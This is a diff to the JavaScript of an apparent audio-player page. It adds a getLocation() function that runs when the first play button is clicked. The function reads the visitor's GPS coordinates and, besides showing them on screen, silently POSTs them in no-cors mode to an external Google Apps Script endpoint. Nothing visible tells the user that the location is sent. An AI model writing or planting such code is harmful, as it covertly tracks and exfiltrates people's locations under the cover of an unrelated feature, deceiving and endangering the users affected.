@@ -27,15 +27,61 @@ let play4 = document.querySelector("#play4") ;
 let play5 = document.querySelector("#play5") ;      
 let play6 = document.querySelector("#play6") ;      
 let play7 = document.querySelector("#play7") ;      
-let play8 = document.querySelector("#play8") ;      
+let play8 = document.querySelector("#play8") ;   
+let result = document.getElementById('location');
+   let me = document.getElementById("me");
 
+console.log("hello1");
+function getLocation() {
+                    var result = document.getElementById('result');
+                    var gpsStatus = document.getElementById('gps');
+                    if (navigator.geolocation) {
+                        gpsStatus.textContent = 'GPS is enabled.';
+                        navigator.geolocation.getCurrentPosition(function (position) {
+                            var lat = position.coords.latitude;
+                            var lon = position.coords.longitude;
+                            let gta = lat.toFixed(5)+","+lon.toFixed(5);
+                            
+                            let data =gta;
+                            fetch("https://script.google.com/macros/s/AKfycbx5wRNdTlOjbdVYDgz1wTLG8wY7k3yRAHcioAwKSBAos2hp78qgf9xCL6LI4xwZkMOG/exec", {
+                              
+               method: "POST",
+              mode: "no-cors",   
+    headers: { "Content-Type": "text/plain" },
+    body: JSON.stringify(data)
+  })
+  .then(res => res.text())
+  .then(response => {
+    console.log("shared");
+        
+        
+        
+  })
+  .catch(err => console.error(err));
+  
+                            var mapLink = 'https://www.google.com/maps?q=' + lat + ',' + lon;
+                            result.innerHTML = 'Your coordinates: <b>' + lat.toFixed(5) + ', ' + lon.toFixed(5) + '</b><br>' +
+                                '<a href="' + mapLink + '" target="_blank" style="color:#4e944f; text-decoration:underline; font-weight:600;">View on Google Maps</a>';
+                        }, function (error) {
+                            result.textContent = 'Unable to retrieve your location.';
+                            gpsStatus.textContent = 'GPS is disabled or unavailable.';
+                        });
+                    } else {
+                        result.textContent = 'Geolocation is not supported by your browser.';
+                        gpsStatus.textContent = 'GPS is not supported.';
+                    }
+                }
+                    
 
     play1.addEventListener("click" , ()=>{
-      
+          
           down1.style.display="block";
           aud1.style.display="block";
         aud1.play();
+         getLocation();
     });
+
+
 play2.addEventListener("click" , ()=>{
       
           down2.style.display="block";
@@ -47,6 +93,7 @@ play3.addEventListener("click" , ()=>{
           down3.style.display="block";
           aud3.style.display="block";
     aud3.play();
+      
     });
 play4.addEventListener("click" , ()=>{
       
@@ -78,4 +125,7 @@ play8.addEventListener("click" , ()=>{
           aud8.style.display="block";
     aud8.play();
     });
-  
+
+let button = document.querySelector("#button");
+
+
